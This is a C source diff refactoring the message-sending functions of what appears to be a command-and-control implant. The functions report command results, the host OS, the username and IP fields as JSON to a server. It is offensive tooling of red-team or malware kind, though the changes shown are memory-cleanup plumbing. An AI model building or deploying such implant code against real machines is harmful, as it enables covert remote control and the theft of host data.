@@ -223,123 +223,130 @@ int download_file(const char *url, const char *output_path)
 // Send back to the agent
 // =======================
 
-// Mock simple send
-// a one off send thingy for sending messages with a randomly generated UUID
-void agent_send_now(HeapStore *heapStorePointer, const char *input)
+/**
+ * agent_send - Send an outbound JSON message and cleanup resources.
+ * @heapStorePointer: Pointer to the HeapStore containing agent and context information.
+ * @OutboundJsonData: Pointer to a populated OutboundJsonDataStruct with agent ID and command results.
+ * @command_id: UUID string to use as the command identifier in the JSON payload.
+ *
+ * Populates metadata fields (int_ip, ext_ip, os, user), encodes the struct as JSON using the
+ * specified command_id, posts it to the server, and frees all allocated fields and the struct.
+ */
+void agent_send(HeapStore *heapStorePointer,
+                OutboundJsonDataStruct *OutboundJsonData,
+                const char *command_id)
 {
-    // Generate a new UUID for the oneoff message.
-    char uuid[37]; // Correctly declare a 37-byte character array.
-    generate_uuid4(uuid);
-
-    // Allocate and initialize an outbound JSON structure.
-    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
-    if (!OutboundJsonData)
-    {
-        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
-        return;
-    }
-
-    // Duplicate the agent ID from the heap store.
-    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id);
-    if (!OutboundJsonData->agent_id)
-    {
-        DEBUG_LOG("Memory allocation failed for agent_id.\n");
-        free(OutboundJsonData);
-        return;
-    }
-
-    // Set the command result data to the input provided.
-    OutboundJsonData->command_result_data = strdup(input);
-    if (!OutboundJsonData->command_result_data)
-    {
-        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
-        free(OutboundJsonData->command_result_data);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // typedef struct
-    // {
-    //     char *command_result_data; // Variable-length string
-    //     char *command_id;          // Variable-length string
-    //     char *agent_id;
-    //     // metadata fields
-    //     char *int_ip;
-    //     char *ext_ip;
-    //     char *user;
-    // } OutboundJsonDataStruct;
-
-    // Add additional metadata
-
-    // interal ip
-    char *int_ip = "placeholder_int_ip";
-    OutboundJsonData->int_ip = strdup(int_ip);
-    if (!OutboundJsonData->int_ip)
-    {
-        DEBUG_LOG("Memory allocation failed for int_ip.\n");
-        free(OutboundJsonData->int_ip);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // external ip
-    char *ext_ip = "placeholder_ext_ip";
-    OutboundJsonData->ext_ip = strdup(ext_ip);
-    if (!OutboundJsonData->ext_ip)
-    {
-        DEBUG_LOG("Memory allocation failed for ext_ip.\n");
-        free(OutboundJsonData->ext_ip);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // os
+    // Add metadata
+    OutboundJsonData->int_ip = strdup("placeholder_int_ip");
+    OutboundJsonData->ext_ip = strdup("placeholder_ext_ip");
     OutboundJsonData->os = get_os(heapStorePointer);
-    if (!OutboundJsonData->os)
-    {
-        DEBUG_LOG("Memory allocation failed for os.\n");
-        free(OutboundJsonData->os);
-        free(OutboundJsonData);
-        return;
-    }
+    OutboundJsonData->user = get_current_username(heapStorePointer);
 
-    // char *user = "placeholder_username";
-    char *user = get_current_username(heapStorePointer);
-    OutboundJsonData->user = strdup(user);
-    if (!OutboundJsonData->user)
-    {
-        DEBUG_LOG("Memory allocation failed for user.\n");
-        free(OutboundJsonData->user);
-        free(OutboundJsonData);
-        return;
-    }
+    // Encode JSON
+    char *encoded_json_response = encode_json(
+        OutboundJsonData->agent_id,
+        OutboundJsonData->command_result_data,
+        command_id,
+        OutboundJsonData->int_ip,
+        OutboundJsonData->ext_ip,
+        OutboundJsonData->os,
+        OutboundJsonData->user);
 
-    // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
-    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
-                                              OutboundJsonData->command_result_data,
-                                              uuid,
-                                              OutboundJsonData->int_ip,
-                                              OutboundJsonData->ext_ip,
-                                              OutboundJsonData->os,
-                                              OutboundJsonData->user);
-    if (!encoded_json_response)
-    {
-        DEBUG_LOG("Failed to encode JSON response.\n");
-        free(OutboundJsonData->agent_id);
-        free(OutboundJsonData->command_result_data);
-        free(OutboundJsonData);
-        return;
-    }
+    // Post to server
+    post_data(encoded_json_response,
+              heapStorePointer->agentStore->agent_id);
 
-    // Send the JSON message to the designated endpoint.
-    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
-
-    // Free the allocated memory.
+    // Cleanup outbound
     free(encoded_json_response);
     free(OutboundJsonData->agent_id);
     free(OutboundJsonData->command_result_data);
     free(OutboundJsonData->int_ip);
     free(OutboundJsonData->ext_ip);
     free(OutboundJsonData->os);
+    free(OutboundJsonData->user);
+    free(OutboundJsonData);
+}
+
+/**
+ * agent_send_now - Send a one-off JSON message with a generated UUID.
+ * @heapStorePointer: Pointer to the HeapStore containing agent and context information.
+ * @input: The string to set as command_result_data in the JSON payload.
+ *
+ * Generates a new UUID for the message, allocates and populates an OutboundJsonDataStruct
+ * with agent ID and the provided input, adds metadata, encodes as JSON, posts it,
+ * and frees all allocated resources.
+ */
+void agent_send_now(HeapStore *heapStorePointer, const char *input)
+{
+    // Generate a new UUID for this message
+    char uuid[37];
+    generate_uuid4(uuid);
+
+    // Allocate outbound structure
+    OutboundJsonDataStruct *OutboundJsonData = calloc(1, sizeof(*OutboundJsonData));
+    if (!OutboundJsonData)
+    {
+        DEBUG_LOG("Memory allocation failed for OutboundJsonData.");
+        return;
+    }
+
+    // Populate required fields
+    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id);
+    if (!OutboundJsonData->agent_id)
+    {
+        DEBUG_LOG("Memory allocation failed for agent_id.");
+        free(OutboundJsonData);
+        return;
+    }
+
+    OutboundJsonData->command_result_data = strdup(input);
+    if (!OutboundJsonData->command_result_data)
+    {
+        DEBUG_LOG("Memory allocation failed for command_result_data.");
+        free(OutboundJsonData->agent_id);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // Add metadata
+    OutboundJsonData->int_ip = strdup("placeholder_int_ip");
+    OutboundJsonData->ext_ip = strdup("placeholder_ext_ip");
+    OutboundJsonData->os = get_os(heapStorePointer);
+    OutboundJsonData->user = get_current_username(heapStorePointer);
+
+    // Encode JSON payload
+    char *encoded_json_response = encode_json(
+        OutboundJsonData->agent_id,
+        OutboundJsonData->command_result_data,
+        uuid,
+        OutboundJsonData->int_ip,
+        OutboundJsonData->ext_ip,
+        OutboundJsonData->os,
+        OutboundJsonData->user);
+    if (!encoded_json_response)
+    {
+        DEBUG_LOG("Failed to encode JSON response.");
+        // Cleanup before exit
+        free(OutboundJsonData->agent_id);
+        free(OutboundJsonData->command_result_data);
+        free(OutboundJsonData->int_ip);
+        free(OutboundJsonData->ext_ip);
+        free(OutboundJsonData->os);
+        free(OutboundJsonData->user);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // Send the message
+    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
+
+    // Free resources
+    free(encoded_json_response);
+    free(OutboundJsonData->agent_id);
+    free(OutboundJsonData->command_result_data);
+    free(OutboundJsonData->int_ip);
+    free(OutboundJsonData->ext_ip);
+    free(OutboundJsonData->os);
+    free(OutboundJsonData->user);
     free(OutboundJsonData);
 }
